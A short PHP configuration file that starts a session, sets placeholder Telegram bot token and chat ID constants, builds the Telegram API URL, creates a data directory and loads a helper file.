<?php
// include/config.php
session_start();

// Telegram Configuration
define('BOT_TOKEN', 'TELEGRAM_TOKEN_HERE');
define('CHAT_ID', 'TELEGRAM_CHATID');


define('TELEGRAM_API', 'https://api.telegram.org/bot' . BOT_TOKEN);
define('DATA_DIR', __DIR__ . '/../data/');

// Create data directory
if (!is_dir(DATA_DIR)) {
    mkdir(DATA_DIR, 0755, true);
}

// Load info helpers
require_once __DIR__ . '/info.php';
?>
